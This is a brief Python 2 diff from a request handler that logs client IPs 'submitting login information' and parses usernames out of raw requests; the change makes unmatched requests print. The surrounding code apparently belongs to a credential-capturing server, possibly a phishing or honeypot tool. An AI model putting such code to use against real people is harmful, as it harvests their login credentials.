@@ -89,7 +89,8 @@ def run(handler):
                             pass
                 open(log_file_name, 'a').write('[*] %s is submitting login information.\nUser Agent: %s\n' %
                                                (client_addr[0], user_agent))
-                # print request
+            else:
+                print request
             # Login attempts TODO: Encrypt how credentials are sent over the wire
             if len(request.split('username=')) > 1:
                 uname = request.split('username=')[1].split('&')[0]
